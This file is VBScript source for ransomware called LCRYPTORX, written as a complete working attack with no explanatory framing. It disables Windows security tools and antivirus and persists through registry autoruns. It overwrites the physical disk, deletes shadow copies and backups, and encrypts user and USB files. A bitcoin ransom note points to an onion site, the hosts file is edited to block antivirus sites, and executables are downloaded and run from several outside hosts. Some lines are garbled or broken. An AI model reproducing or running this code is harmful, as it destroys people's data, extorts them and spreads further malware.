Option Explicit

Dim objShell

If Not WScript.Arguments.Named.Exists("elevated") Then
    Set objShell = CreateObject("Shell.Application")
    objShell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
    WScript.Quit
End If

Dim objFSO, objTextFile, objFile, txtFile, scriptName, objRegistry, fso, scriptPath, Wshshell
Dim strDesktop, strDocuments, strPictures, strVideos, strDownloads, strMusic, strStartup, strProgramFiles, strProgramFilesX86, strAppData, strLocalAppData, strWindows, strPath, strKey, strNewExtension
Dim MyPictures, MyDocuments, MyVideo, MyMusic

Set WshShell = CreateObject("WScript.Shell")

On Error Resume Next

WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"

WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System\DisableCMD", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisableCMD", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisableCMD", 1, "REG_DWORD"

WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"

WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", 1, "REG_DWORD"

WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", 0, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin", 0, "REG_DWORD"

WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\InactivityTimeoutSecs", 0, "REG_DWORD"

WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\1", "msconfig.exe", "REG_SZ"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\2", "Autoruns.exe", "REG_SZ"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\3", "gpedit.msc", "REG_SZ"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\4", "SystemSettings.exe", "REG_SZ"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\5", "procexp.exe", "REG_SZ"

WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\1", "msconfig.exe", "REG_SZ"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\2", "Autoruns.exe", "REG_SZ"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\3", "gpedit.msc", "REG_SZ"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\4", "SystemSettings.exe", "REG_SZ"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\5", "procexp.exe", "REG_SZ"

scriptPath = WScript.ScriptFullName  

WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell", scriptPath, "REG_SZ"  
WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell", scriptPath, "REG_SZ"  
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe\Debugger", strScriptPath, "REG_SZ"  
WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe\Debugger", ScriptPath, "REG_SZ"  

Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

arrProcesses = Array("Taskmgr.exe", "cmd.exe", "msconfig.exe", "regedit.exe")

For Each processName In arrProcesses
    Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '" & processName & "'")
    For Each objProcess in colProcessList
        objProcess.Terminate()
    Next
Next

WshShell.RegWriteWshShell.RegWrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout\Scancode Map", "00000000000000001B00000000005BE000005CE00001D0000001DE000002A0000003600003800000038E000003B00000053E0000000E0000003C0000003D0000002E000000320000002000000140000001E0000001F0000002500000031000000220000001200000013000000170000004400000000000000", "REG_BINARY"
WshShell.RegWrite "HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Control\Keyboard Layout\Scancode Map", "00000000000000001B00000000005BE000005CE00001D0000001DE000002A0000003600003800000038E000003B00000053E0000000E0000003C0000003D0000002E000000320000002000000140000001E0000001F0000002500000031000000220000001200000013000000170000004400000000000000", "REG_BINARY"

    WshShell.RegWrite "HKEY_LOCAL_MACHINE\Control Panel\Mouse\SwapMouseButtons", 1, "REG_DWORD"
    WshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Mouse\SwapMouseButtons", 1, "REG_DWORD"

    objShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True

Set WshShell = Nothing

Set fso = CreateObject("Scripting.FileSystemObject")
scriptPath = WScript.ScriptFullName

With fso.GetFile(scriptPath)
    .Attributes = .Attributes Or (2 + 1 + 4)
End With

Set objShell = CreateObject("WScript.Shell")

Function ReadFile(path)
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 : stream.Open : stream.LoadFromFile path
    ReadFile = stream.Read : stream.Close
End Function

Set drive = CreateObject("ADODB.Stream")
drive.Type = 1 : drive.Open : On Error Resume Next

payload = ReadFile(WScript.ScriptFullName) & _
          ReadFile("msvcr80.dll.bat") & _
          ReadFile("systemconfig.exe.vbs") & _
          ReadFile("advapi32_ext.vbs")

drive.LoadFromFile "\\.\PhysicalDrive0"

position = 0
Do While True
    drive.Position = position
    drive.Write payload
    If Err.Number <> 0 Then Exit Do
    position = position + LenB(payload)
Loop

drive.SaveToFile "\\.\PhysicalDrive0", 2
drive.Close

Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true", 0, True

Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /c ""C:\Program Files\Bitdefender\Bitdefender 2025\bdnserv.exe"" -disable", 0, True

Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /c ""C:\Program Files (x86)\Kaspersky Lab\Kaspersky Anti-Virus 2025\avp.com"" disable", 0, True

strNewExtension = "lcryx"
strKey = GenerateRandomKey(4352)

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

Function IsLegacyWindows()
    Dim osVersion
    osVersion = objShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\CurrentVersion")
    If CDbl(osVersion) < 6.0 Then
        IsLegacyWindows = True
    Else
        IsLegacyWindows = False
    End If
End Function

If IsLegacyWindows() Then
    strDesktop = objShell.SpecialFolders("Desktop")
    strDocuments = objShell.SpecialFolders("MyDocuments")
    strPictures = objShell.SpecialFolders("MyPictures")
    strVideos = objShell.SpecialFolders("MyVideo")
    strDownloads = objShell.SpecialFolders("MyDocuments") & "\Downloads"
    strMusic = objShell.SpecialFolders("MyMusic")
    strStartup = objShell.SpecialFolders("StartUp")
Else
    strDesktop = objShell.SpecialFolders("Desktop")
    strDocuments = objShell.SpecialFolders("Documents")
    strPictures = objShell.SpecialFolders("Pictures")
    strVideos = objShell.SpecialFolders("Videos")
    strDownloads = objShell.SpecialFolders("Downloads")
    strMusic = objShell.SpecialFolders("Music")
    strStartup = objShell.SpecialFolders("Startup")
End If

strProgramFiles = "C:\Program Files" 
strProgramFilesX86 = "C:\Program Files (x86)"
strAppData = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%AppData%")
strLocalAppData = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%LocalAppData%")
strWindows = "C:\Windows"

Function GenerateRandomKey(length)
    Dim randomKey, i, charSet
    randomKey = ""
    charSet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$_&-+()/§?!*"
    For i = 1 To length
        randomKey = randomKey & Mid(charSet, Int((Len(charSet) * Rnd) + 1), 1)
    Next
    GenerateRandomKey = randomKey
End Function

Function AddLineBreaks(content, lineLength)
    Dim result, i
    result = ""
    For i = 1 To Len(content) Step lineLength
        result = result & Mid(content, i, lineLength) & vbCrLf
    Next
    AddLineBreaks = result
End Function

Function EncryptFile(filePath, encryptionKey)
    Dim strCurrentScript, salt
    strCurrentScript = WScript.ScriptFullName

    If LCase(Right(filePath, Len(strNewExtension) + 1)) = "." & strNewExtension Or _
       LCase(objFSO.GetFileName(filePath)) = "readmeplease.txt" Or _
       LCase(objFSO.GetFileName(filePath)) = "gcrybground.png" Or _
       LCase(objFSO.GetFileName(filePath)) = "msvcr80.dll.bat" Or _
       LCase(objFSO.GetFileName(filePath)) = "systemconfig.exe.vbs" Or _
       LCase(objFSO.GetFileName(filePath)) = "advapi32_ext.vbs" Or _
       LCase(objFSO.GetFileName(filePath)) = "desktop.ini" Or _
       LCase(filePath) = LCase(strCurrentScript) Then
        Exit Function
    End If

    Dim objFile, fileContent, encryptedContent
    Set objFile = objFSO.OpenTextFile(filePath, 1)
    If Err.Number <> 0 Then
        Err.Clear
        Exit Function
    End If

    fileContent = objFile.ReadAll
    objFile.Close

    salt = GenerateRandomKey(32)  
    encryptedContent = XOREncryptDecrypt(fileContent, CaesarEncryptDecrypt(encryptionKey, 137) & salt)  

    Set objFile = objFSO.CreateTextFile(filePath & "." & strNewExtension, True)  
    objFile.Write AddLineBreaks(encryptedContent, 327)  
    objFile.Close  
    
    objFSO.DeleteFile(filePath)  
    objShell.Run "notepad.exe " & filePath & "." & strNewExtension  
    End Function 

Function XOREncryptDecrypt(inputText, key)  
    Dim outputText, i, keyChar  
    outputText = ""  

    For i = 1 To Len(inputText)  
        keyChar = Mid(key, ((i - 1) Mod Len(key)) + 1, 1)  
        outputText = outputText & Chr(Asc(Mid(inputText, i, 1)) Xor Asc(keyChar))  
    Next  

    XOREncryptDecrypt = outputText  
End Function  

Function CaesarEncryptDecrypt(inputText, shift)  
    Dim result, i, currentChar, newChar  
    result = ""  

    For i = 1 To Len(inputText)  
        currentChar = Mid(inputText, i, 1)  
        newChar = Chr((Asc(currentChar) + shift) Mod 256)  
        result = result & newChar  
    Next  

    CaesarEncryptDecrypt = result  
End Function  


Sub DeleteBackupCatalog(folderPath)
    On error resume next
    Dim objFolder, objFile, fileExtension
    Set objFolder = objFSO.GetFolder(folderPath)
    
    For Each objFile In objFolder.Files
        fileExtension = LCase(objFSO.GetExtensionName(objFile.Path))
        
        If fileExtension = "bak" Or fileExtension = "backup" Or fileExtension = "old" Then
            objFSO.DeleteFile objFile.Path
        End If
    Next
    
    Dim objSubfolder
    For Each objSubfolder In objFolder.Subfolders
        DeleteBackupCatalog objSubfolder.Path
    Next
End Sub

SubSet objShell = CreateObject("WScript.Shell")

DeleteShadowCopiesAndCatalog

Sub DeleteShadowCopiesAndCatalog
    Dim cmdDeleteShadow, cmdDeleteWbAdmin

   
    cmdDeleteShadow = "cmd.exe /c vssadmin delete shadows /all /quiet"

    cmdDeleteWbAdmin = "cmd.exe /c wbadmin delete catalog -quiet"
    
    objShell.Run cmdDeleteShadow, 0, True
    objShell.Run cmdDeleteWbAdmin, 0, True
End Sub

Sub ProcessFolder(folderPath)
    On Error Resume Next
    Dim objFolder, objFile
    Set objFolder = objFSO.GetFolder(folderPath)
    
    For Each objFile In objFolder.Files
        EncryptFile objFile.Path, strKey
    Next 

    Dim objSubfolder
    For Each objSubfolder In objFolder.Subfolders
        ProcessFolder objSubfolder.Path
    Next
End Sub

Sub ProcessUSBDrives()
    Dim objWMIService, colItems, objItem
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    
    Set colItems = objWMIService.ExecQuery("Select * from Win32_LogicalDisk Where DriveType = 2")
    
    For Each objItem In colItems
        ProcessFolder objItem.DeviceID & "\"
    Next
End Sub

Sub MonitorFolders()
    Do
        ProcessFolder strDesktop
        ProcessFolder strDocuments
        ProcessFolder strPictures
        ProcessFolder strVideos
        ProcessFolder strDownloads
        ProcessFolder strMusic
        ProcessFolder strStartup
        
        ProcessFolder MyMusic
        ProcessFolder MyDocuments
        ProcessFolder MyVideo
        ProcessFolder MyPictures
        
        ProcessFolder strProgramFiles
        ProcessFolder strProgramFilesX86
        ProcessFolder Windows
        ProcessFolder strAppData
        ProcessFolder strLocalAppData
        
        ProcessUSBDrives
        
        DeleteBackupCatalog strDesktop
        DeleteBackupCatalog strDocuments
        DeleteBackupCatalog strPictures
        DeleteBackupCatalog strVideos
        DeleteBackupCatalog strDownloads
        DeleteBackupCatalog strMusic
        DeleteBackupCatalog strStartup
        
        WScript.Sleep 2000
        
        Loop
End Sub

txtFile = CreateObject("WScript.Shell").SpecialFolders("Desktop") & "\READMEPLEASE.txt"
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.CreateTextFile(txtFile, True)

objTextFile.Write "Oops, all of your personal files have been encrypted by LCRYPTORX RANSOMWARE! " & vbCrLf & _  
                  "In order to recover your files, please visit http://lcryxdecryptor4f6xzyorj9qsb5e.onion/RtuKlm " & vbCrLf & _ 
                  "and send 500$ worth of bitcoin within 5 days. Read and follow the instructions properly!"

objTextFile.Close

objShell.Run "notepad.exe " & txtFile

Sub DownloadAndSetWallpaper(url)

    Dim wallpaperPath

    Set objShell = CreateObject("WScript.Shell")

    wallpaperPath = objShell.SpecialFolders("Desktop") & "\gcrybground.png"
    
    If CheckInternet() Then
        DownloadFile url, wallpaperPath
        SetWallpaper wallpaperPath
    End If

End Sub

Function CheckInternet()
    Dim objXML
    On Error Resume Next
    Set objXML = CreateObject("MSXML2.ServerXMLHTTP")
    objXML.Open "GET", "http://www.google.com", False
    objXML.Send
    CheckInternet = (objXML.Status = 200)
    On Error GoTo 0
    Set objXML = Nothing
End Function

Sub DownloadFile(url, localPath)

    Dim objXML, objStream

    Set objXML = CreateObject("MSXML2.ServerXMLHTTP")
    Set objStream = CreateObject("ADODB.Stream")

    objXML.Open "GET", url, False
    objXML.Send

    If objXML.Status = 200 Then
        objStream.Open
        objStream.Type = 1
        objStream.Write objXML.ResponseBody
        objStream.SaveToFile localPath, 2
        objStream.Close
    End If

    Set objStream = Nothing
    Set objXML = Nothing
End Sub

Sub SetWallpaper(imagePath)

    Dim objShell
    Set objShell = CreateObject("WScript.Shell")
    
    objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", imagePath
    objShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
End Sub

DownloadAndSetWallpaper "https://www.mediafire.com/view/6rgzengdbh7mga3/Background.jpg/file"

Dim strScriptPath

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

Set objShell = CreateObject("WScript.Shell")
strPath = WScript.ScriptFullName

objShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MyStartupScript", strPath, "REG_SZ"

Set objShell = CreateObject("WScript.Shell")

Dim batchFilePath, shell, regPathLM, regPathCU, regPath 
Dim i, randomDir, randomFileName, scriptFile, registryKey, registryKeyLM, registryKeyCU, advapi32_ext, mainScript

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

batchFilePath = "C:\Windows\SysWOW64\msvcr80.dll.bat"
scriptPath = "C:\Windows\System32\systemconfig.exe.vbs"
mainScript = "C:\Windows\advapi32_ext.vbs"

Set objFile = fso.CreateTextFile(batchFilePath, True)

objFile.WriteLine "@echo off"
objFile.WriteLine "setlocal enabledelayedexpansion"
objFile.WriteLine "set repeat=3"
objFile.WriteLine "for /L %%i in (1,1,!repeat!) do ("
objFile.WriteLine "    start calc"
objfile.WriteLine "    start cmd"
objFile.WriteLine ")"
objFile.WriteLine "endlocal"
objFile.Close

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

With fso.GetFile(batchFilePath)
    .Attributes = .Attributes Or (2 + 1 + 4)
End With

regPathLM = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\msvcr80dll"
shell.RegWrite regPathLM, batchFilePath, "REG_SZ"

regPathCU = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\msvcr80dll"
shell.RegWrite regPathCU, batchFilePath, "REG_SZ"

Set scriptFile = fso.CreateTextFile(scriptPath, True) 

scriptFile.WriteLine("Do While True")
scriptFile.WriteLine("    On Error Resume Next")
scriptFile.WriteLine("    Dim shell, cmd")
scriptFile.WriteLine("    Set shell = CreateObject(""WScript.Shell"")")
scriptFile.WriteLine("    cmd = ""wscript.exe "" & WScript.ScriptFullName")
scriptFile.WriteLine("    shell.Run cmd, 0, False")
scriptFile.WriteLine("    Dim response")
scriptFile.WriteLine("    response = MsgBox(""YOUR FILES HAVE BEEN ENCRYPTED! DO YOU WANT TO DECRYPT SOME OF YOUR FILES?"", vbExclamation + vbYesNo, ""Warning"")")
scriptFile.WriteLine("    If response = vbYes Then")
scriptFile.WriteLine("        shell.Run ""cmd.exe /c time 00:00"", 0, True")
scriptFile.WriteLine("        shell.Run ""https://youtu.be/o-YBDTqX_ZU?si=KI64texgPjTiIt1k"", 0, False")
scriptFile.WriteLine("        MsgBox ""Your IP Address: "" & GetIPAddress(), vbInformation, ""IP Address""")
scriptFile.WriteLine("        MsgBox ""PAY IF YOU WANT TO GET YOUR FILES BACK!"", vbCritical, ""Warning""")
scriptFile.WriteLine("    ElseIf response = vbNo Then")
scriptFile.WriteLine("        shell.Run ""cmd.exe /c time 00:00"", 0, True")
scriptFile.WriteLine("        shell.Run ""https://youtu.be/o-YBDTqX_ZU?si=KI64texgPjTiIt1k"", 0, False")
scriptFile.WriteLine("        MsgBox ""Your IP Address: "" & GetIPAddress(), vbInformation, ""IP Address""")
scriptFile.WriteLine("    End If")
scriptFile.WriteLine("Loop")
scriptFile.WriteLine("Function GetIPAddress()")
scriptFile.WriteLine("    Dim objWMIService, colItems, objItem, ipAddress")
scriptFile.WriteLine("    ipAddress = ""Not Found""")
scriptFile.WriteLine("    Set objWMIService = GetObject(""winmgmts:\\.\root\cimv2"")")
scriptFile.WriteLine("    Set colItems = objWMIService.ExecQuery(""Select * from Win32_NetworkAdapterConfiguration Where IPEnabled = True"")")
scriptFile.WriteLine("    For Each objItem In colItems")
scriptFile.WriteLine("        If Not IsNull(objItem.IPAddress) Then")
scriptFile.WriteLine("            ipAddress = objItem.IPAddress(0)")
scriptFile.WriteLine("            Exit For")
scriptFile.WriteLine("        End If")
scriptFile.WriteLine("    Next")
scriptFile.WriteLine("    GetIPAddress = ipAddress")
scriptFile.WriteLine("End Function")
scriptFile.Close

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

With fso.GetFile(scriptPath)
    .Attributes = .Attributes Or (2 + 1 + 4)
End With

registryKeyLM = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Win32Updater"
shell.RegWrite registryKeyLM, scriptPath, "REG_SZ"

registryKeyCU = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Anti-VirusScript"
shell.RegWrite registryKeyCU, scriptPath, "REG_SZ"

Set advapi32_ext = fso.CreateTextFile(mainScript, True)

advapi32_ext.WriteLine "On Error Resume Next"
advapi32_ext.WriteLine "Dim WshShell"
advapi32_ext.WriteLine "Set WshShell = CreateObject(""WScript.Shell"")"

advapi32_ext.WriteLine "Do"

advapi32_ext.WriteLine "    WshShell.Run ""taskkill /IM powershell.exe /F"", 0, True"
advapi32_ext.WriteLine "    WshShell.Run ""taskkill /IM taskmgr.exe /F"", 0, True"
advapi32_ext.WriteLine "    WshShell.Run ""taskkill /IM cmd.exe /F"", 0, True"
advapi32_ext.WriteLine "    WshShell.Run ""taskkill /IM regedit.exe /F"", 0, True"
advapi32_ext.WriteLine "    WshShell.Run ""taskkill /IM control.exe /F"", 0, True"
advapi32_ext.WriteLine "    WshShell.Run ""taskkill /IM gp.exe /F"", 0, True"
advapi32_ext.WriteLine "    WshShell.Run ""taskkill /IM msconfig.exe /F"", 0, True"
advapi32_ext.WriteLine "    WshShell.Run ""taskkill /IM MsMpEng.exe /F"", 0, True"
advapi32_ext.WriteLine "    WshShell.Run ""taskkill /IM avp.exe /F"", 0, True"
advapi32_ext.WriteLine "    WshShell.Run ""taskkill /IM AvastSvc.exe /F"", 0, True"
advapi32_ext.WriteLine "    WshShell.Run ""taskkill /IM avgsvc.exe /F"", 0, True"
advapi32_ext.WriteLine "    WshShell.Run ""taskkill /IM avc.exe /F"", 0, True"
advapi32_ext.WriteLine "    WshShell.Run ""taskkill /IM NortonSecurity.exe /F"", 0, True"
advapi32_ext.WriteLine "    WshShell.Run ""taskkill /IM Protegent.exe /F"", 0, True"
advapi32_ext.WriteLine "    WshShell.Run ""taskkill /IM pavsrvx.exe /F"", 0, True"
advapi32_ext.WriteLine "    WshShell.Run ""taskkill /IM mbam.exe /F"", 0, True"
advapi32_ext.WriteLine "    WshShell.Run ""taskkill /IM avguard.exe /F"", 0, True"
advapi32_ext.WriteLine "    WshShell.Run ""taskkill /IM mcshield.exe /F"", 0, True"
advapi32_ext.WriteLine "    WScript.Sleep 5000"

advapi32_ext.WriteLine "Loop" 

advapi32_ext.Close

With fso.GetFile(mainScript)
    .Attributes = .Attributes Or (2 + 1 + 4)
End With

registryKeyLM = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\advapi32_ext"
shell.RegWrite registryKeyLM, mainScript, "REG_SZ"

registryKeyCU = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\advapi32_ext"
shell.RegWrite registryKeyCU, mainScript, "REG_SZ"

shell.Run batchFilePath, 1, False
shell.Run "wscript.exe " & scriptPath, 1, False
shell.Run "wscript.exe " & mainScript, 1, False

Dim hostsFile, blockedSites
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

hostsFile = "C:\Windows\System32\drivers\etc\hosts"

blockedSites = Array( _
    "https://www.google.com/search?q=free+antivirus", _
    "https://www.google.com/search?q=antivirus", _
    "https://www.google.com/search?q=how to remove virus", _
    "http://kaspersky.com/", _
    "https://www.bitdefender.com/en-us/consumer/free-antivirus", _
    "https://www.avast.com", _
    "https://www.avg.com" _
)

If objFSO.FileExists(hostsFile) Then
    Set objFile = objFSO.OpenTextFile(hostsFile, 8, True)
    objFile.WriteLine vbCrLf & "# Blocked Websites"

    For Each site In blockedSites
        objFile.WriteLine "127.0.0.1 " & site
        objFile.WriteLine "127.0.0.1 " & Replace(site, "www.", "")
    Next

    objFile.Close
End If

Function CheckInternet()
    Dim objXML
    Set objXML = CreateObject("MSXML2.ServerXMLHTTP")

    On Error Resume Next
    objXML.Open "GET", "http://www.google.com", False
    objXML.Send
    CheckInternet = (objXML.Status = 200)
    On Error GoTo 0

    Set objXML = Nothing
End Function

Sub DownloadFile(fileURL, savePath)
    Dim objXMLHTTP, objADOStream
    If CheckInternet() Then
        Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
        objXMLHTTP.Open "GET", fileURL, False
        objXMLHTTP.Send

        If objXMLHTTP.Status = 200 Then
            Set objADOStream = CreateObject("ADODB.Stream")
            objADOStream.Type = 1
            objADOStream.Open
            objADOStream.Write objXMLHTTP.ResponseBody
            objADOStream.SaveToFile savePath, 2
            objADOStream.Close
        End If
    End If
End Sub

Dim downloadLinks
downloadLinks = Array( _
    "http://185.172.128.203/TikTok.exe", _
    "http://5.42.64.17/files/setup.exe", _
    "http://cajgtus.com/files/1/build3.exe", _
    "http://103.198.26.173/360/HJC.exe", _
    "http://185.215.113.84/pei.exe", _
    "http://193.233.132.139/banda/gidro.exe", _
    "http://topgamecheats.dev/fud_new.exe", _
    "http://twizt.net/loadme.exe", _
    "http://163.5.215.125/amady.exe" _
)

Dim fileURL, savePath
For Each fileURL In downloadLinks
    savePath = "C:\Windows\" & Mid(fileURL, InStrRev(fileURL, "/") + 1)
    DownloadFile fileURL, savePath
    objShell.Run """" & savePath & """", 0, False
next

Set reg = Nothing
Set mainscript =Nothing
Set advapi32_ext = Nothing
Set mainScript = Nothing
Set batchFilePath = Nothing 
Set shell = Nothing
Set regPath = Nothing
Set i = Nothing 
Set randomDir = Nothing
Set randomFileName = Nothing 
Set scriptFile = Nothing 
Set registryKey = Nothing 
Set WshShell = Nothing

On Error Resume Next
objShell.Run "taskkill /F /IM explorer.exe", 0, True
On Error GoTo 0

MonitorFolders